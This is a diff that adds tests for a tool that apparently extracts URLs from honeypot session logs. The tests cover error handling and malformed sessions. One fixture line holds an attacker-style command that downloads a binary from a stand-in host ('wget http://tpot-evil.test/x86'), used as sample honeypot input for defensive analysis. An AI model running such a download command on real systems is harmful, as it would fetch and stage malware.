@@ -18,3 +18,21 @@ def test_http_error_stores_nothing(tpot2evaluator_mod, http_mock, config, db):
     tpot2evaluator_mod.tpot2evaluator()
 
     assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0
+
+
+def test_invalid_response_stores_nothing(tpot2evaluator_mod, http_mock, config, db):
+    http_mock.post(config.tpot_url, body="<html>maintenance</html>")
+
+    tpot2evaluator_mod.tpot2evaluator()  # logged, never raises out of the scheduler job
+
+    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0
+
+
+def test_malformed_session_does_not_stop_the_others(tpot2evaluator_mod, http_mock, config, db):
+    http_mock.post(config.tpot_url, json=[
+        {"timestamp": "2026-01-01T09:00:00Z"},  # no input
+        {"timestamp": "2026-01-01T10:00:00Z", "input": "wget http://tpot-evil.test/x86"}])
+
+    tpot2evaluator_mod.tpot2evaluator()
+
+    assert db.execute("SELECT url FROM urls").fetchall() == [("http://tpot-evil.test/x86",)]
